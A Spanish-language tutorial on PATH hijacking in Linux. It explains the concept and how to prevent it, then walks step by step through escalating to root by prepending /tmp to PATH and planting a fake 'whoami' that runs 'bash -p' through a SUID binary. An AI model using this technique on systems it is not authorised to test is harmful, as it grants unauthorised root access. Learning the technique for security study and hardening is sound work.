# PATH Hijacking

Tags: #Linux #PathHijacking  #Escalada #Root #Privilegios

**PATH Hijacking** es una técnica utilizada por los atacantes para **secuestrar** **comandos** de un sistema Unix/Linux mediante la manipulación del **PATH**. El PATH es una variable de entorno que define las rutas de búsqueda para los archivos ejecutables en el sistema.

En algunos binarios compilados, algunos de los comandos definidos internamente pueden ser indicados con una ruta relativa en lugar de una ruta absoluta. Esto significa que el binario busca los archivos ejecutables en las rutas especificadas en el PATH, en lugar de utilizar la ruta absoluta del archivo ejecutable.

Si un atacante es capas de alterar el PATH y crear un nuevo archivo con el mismo nombre de uno de los comandos definidos internamente en el binario, puede lograr que el binario ejecute la versión maliciosa del comando en lugar de la versión legítima.

Por ejemplo, si un binario compilado utiliza el comando “**ls**” sin su ruta absoluta en su código y el atacante crea un archivo malicioso llamado “**ls**” en una de las rutas especificadas en el PATH, el binario ejecutará el archivo malicioso en lugar del comando legítimo “**ls**” cuando sea llamado.

Para prevenir el PATH Hijacking, se recomienda utilizar **rutas absolutas** en lugar de rutas relativas en los comandos definidos internamente en los binarios compilados. Además, es importante asegurarse de que las rutas en el PATH sean controladas y limitadas a las rutas necesarias para el sistema. También se recomienda utilizar la opción de permisos de ejecución para los archivos ejecutables solo para los usuarios y grupos autorizados.


## Path Hijacking

Para este tipo de escalada debemos de encontrar un archivo ejecutable SUID que el propietario sea Root y este ejecutando por detrás otro comando.

```bash
-rwsr-xr-x 1 root root 8756 Feb 7 2022 test        # <- Binario que debemos de encontrar
-rwsr-xr-x 1 root root 8756 Feb 7 2022 test.c
```

Al momento de ejecutarlos nos arroja lo siguiente:
```bash 
[+] Actualmente somos el siguiente usuario: 
root 

[+] Actualmente somos el siguiente usuario:
root
```

Al momento de ejecutarlo nos muestra root, pero ese output viene por el comando 'whoami'. Esto quiere decir que por detrás ese binario esta ejecutando el comando whoami como root. El primer root es por el comando 'whoami' de forma absoluta '/usr/bin/whoami' y el segundo root es por la forma relativa del whoami.

Aquí podemos el Path de la maquina victima.
```python 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

Cuando nosotros ejecutamos un comando por ejemplo **'ls'** no es necesario poner toda la ruta absoluta **'/usr/bin/ls'** porque de forma relativa ya se encuentra contemplado en el PATH de arriba. Lo que hace el sistema es de forma automática ir buscando ruta por ruta para ver si el binario existe y así ejecutarlo.

El PATH es una variable de entorno y por ende la podemos manipular.
Para poder hacer el Path Hijacking es necesario modificar el PATH colocando como primer lugar la ruta en donde crearemos nuestro binario. 

```bash 
❯ export PATH=/tmp/:$PATH                    # Le diremos que primero busque por el dir /tmp/ y despues por las rutas del PATH, la prioridad de busqueda es de izquierda a derecha 
```

Debemos de crear este archivo en el dir **/tmp/** ya que en una maquina victima, en este dir tenemos privilegios de lectura y escritura.
```bash 
❯ nvim whoami
❯ chmod +x whoami 

# Dentro del file, podemos colocar lo siguiente:
bash -p                     # Nos ejecute una bash p = privilege
```

Una vez modificada la ruta, al momento de volver a ejecutar el archivo **'test'** este por detrás ejecutara el comando **'whoami'** pero como hemos puesto en el PATH que primero busque en el dir **/tmp/** y ahí nosotros tenemos un archivo creado anteriormente llamado **'whoami'** este será el que ejecutara el sistema. Pero como lo hemos modificado, ejecutara el **'bash -p'** y nos otorgara una consola bash con privilegios temporales.

```bash
-rwsr-xr-x 1 root root 8756 Feb 7 2022 test        # <- Binario que ejecutaremos y lo haremos con sudo
-rw-r--r-- 1 root root 8756 Feb 7 2022 test.c
-rwxrwxr-x 1 omar omar 8756 Feb 7 2022 whoami
```

